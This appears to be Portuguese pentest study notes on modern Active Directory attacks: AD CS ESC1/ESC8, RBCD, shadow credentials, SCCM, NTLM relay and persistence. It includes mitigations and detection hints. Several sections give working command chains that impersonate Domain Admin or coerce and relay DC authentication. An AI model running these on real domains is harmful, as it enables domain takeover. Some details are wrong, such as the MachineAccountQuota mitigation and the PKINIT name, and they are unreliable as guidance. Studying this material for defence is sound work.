# Active Directory - Ataques Modernos (2024-2026)

> Complementa o `kerberoasting_teoria.md` e `bloodhound_teoria.md` com vetores que ganharam tracao nos ultimos 24 meses.

---

## 1. Certified Pre-Owned - AD CS abuse (ESCx)

Pesquisa SpecterOps (Will Schroeder + Lee Christensen) revelou multiplos misconfigs em AD Certificate Services. Continua altamente eficaz em 2026.

### ESC1 - Templates com `ENROLLEE_SUPPLIES_SUBJECT`

Atacante solicita certificado em nome de outro usuario (ate de Domain Admin).

```bash
# Linux (certipy)
certipy find -u alice@corp.local -p 'Pass' -dc-ip 10.0.0.10 -enabled -vulnerable
certipy req -u alice@corp.local -p 'Pass' -ca corp-CA -template VulnTemplate -upn administrator@corp.local
certipy auth -pfx administrator.pfx
```

### ESC8 - NTLM relay para Web Enrollment

`http://ca.corp.local/certsrv/` sem EPA + sem HTTPS-only -> relay LM/NTLM e pega cert do alvo.

```bash
sudo ntlmrelayx.py -t http://ca.corp.local/certsrv/certfnsh.asp --adcs --template DomainController
# Trigga vitima a autenticar (PetitPotam, PrinterBug)
PetitPotam.py -d corp.local -u alice -p 'Pass' attacker.corp.local dc01.corp.local
```

**Mitigacao.**
- Auditoria com `certipy find -vulnerable`.
- Desabilitar HTTP no Web Enrollment, exigir EPA.
- Restringir `ENROLLEE_SUPPLIES_SUBJECT` em templates.
- Patches MS recentes (KB para PetitPotam, CVE-2022-26923).

---

## 2. Resource-Based Constrained Delegation (RBCD)

Em vez de pedir cert ou crackear, abuse `msDS-AllowedToActOnBehalfOfOtherIdentity` no proprio computador. Requer apenas `WriteDacl`/`WriteProperty` em um objeto Computer alvo.

```bash
# Linux flow
addcomputer.py -computer-name 'ATTACKER$' -computer-pass 'P@ss' corp.local/alice:'Pass'
rbcd.py -delegate-from 'ATTACKER$' -delegate-to 'DC01$' -action write corp.local/alice:'Pass'
getST.py -spn 'cifs/dc01.corp.local' -impersonate Administrator -dc-ip 10.0.0.10 corp.local/ATTACKER$:'P@ss'
export KRB5CCNAME=Administrator.ccache
psexec.py -k -no-pass dc01.corp.local
```

**Mitigacao.** Remover `ms-DS-MachineAccountQuota=0` para usuarios normais; auditoria de DACL anomalo em Computer objects.

---

## 3. Pre-Authentication-Less Asymmetric Authentication (PKINIT) + Schannel abuse

Quando AD CS coexiste com schannel, autenticacao por cert pode bypassar varios controles.

`PKINITtools / passthecert.py / certipy` abusam isso para obter Ticket Granting Ticket sem precisar de senha.

---

## 4. shadow credentials (msDS-KeyCredentialLink)

Se voce tem `Write` em um user/computer com PKINIT habilitado, pode gravar um KeyCredential e auth via cert depois.

```bash
certipy shadow auto -u alice@corp.local -p 'Pass' -account bob
```

Acaba pegando NT hash do `bob` sem mudar senha (stealthy).

**Mitigacao.** Auditoria de mudancas em `msDS-KeyCredentialLink`. Sysmon EID 4662 com pertinent GUID.

---

## 5. SCCM (Configuration Manager) abuse

Tem ganho atencao com pesquisas do SpecterOps e XPN.

- `RECON`: `SharpSCCM find primary-users`, `find sites`.
- `EXTRACT-NAA`: rouba *Network Access Account credentials* armazenadas em SCCM client policy.
- `RELAY`: relay NTLM do Site Server para SCCM Management Point.

Tools: SharpSCCM (Chris Thompson).

---

## 6. ADCS + Cross-Forest

Templates publicados em forest A mas relacao com B (trust) permite request via Schannel cross-forest. Tools: `Whisker`, `pyWhisker`.

---

## 7. Hunting moderno (defesa pos-Kerberoast)

Microsoft Defender for Identity / MDI agora gera alerta `4924` para "Suspicious Kerberos service ticket request". Outros sinais:

- `4769` com User Agent `Microsoft Kerberos` (legit) vs raw socket (suspicious).
- Spike no count de SPN requests por hora.
- Hash type 23 (RC4) quando o ambiente padrao e AES.

---

## 8. KrbRelayUp e DC sync local

`KrbRelayUp` (Mor Davidovich) usou RPC + LDAP signing missing para escalar de user para SYSTEM. Microsoft patcheou (KB5008380) em 2022; restou explorando ambientes sem patches.

---

## 9. NTLM Relay - novas surface

- **RPC over TCP** -> relay para LDAP (cve-pre-2022).
- **WebDAV trigger** (`searchConnector-ms`, `.library-ms`).
- **WPAD** ainda funciona em redes Wi-Fi corporate (responder + ntlmrelayx).

---

## 10. Persistencia AD Avancada

- **Skeleton key** (Mimikatz) - master password para todos.
- **DCShadow** - se autenticar como DC e injetar mudancas em replicacao.
- **AdminSDHolder** - modificar SDDL e proteger conta backdoor.
- **GoldenSAML** (em ambientes federated).

---

## Ferramentas chave (2026)

| Tool | Linguagem | Foco |
|------|-----------|------|
| **NetExec (nxc)** | Python | Substitui CrackMapExec, multimodulo. |
| **Certipy** | Python | AD CS. |
| **BloodHound CE / 7.x** | TS+Python | Grafo + paths novos (ADCS, RBCD). |
| **bloodhound.py** | Python | Coletor cross-platform. |
| **Rubeus** | C# | Tickets, kerberoast, asreproast. |
| **Impacket** | Python | Suite completa (secretsdump, GetUserSPNs, etc.). |
| **ldapdomaindump** | Python | Dump LDAP estruturado. |
| **Whisker / pyWhisker** | C#/Python | Shadow credentials. |

---

## Referencias

- [SpecterOps - Certified Pre-Owned (PDF)](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf)
- [HackTricks AD pentest](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology)
- [Adsecurity.org](https://adsecurity.org/)
- [Microsoft Defender for Identity docs](https://learn.microsoft.com/en-us/defender-for-identity/)
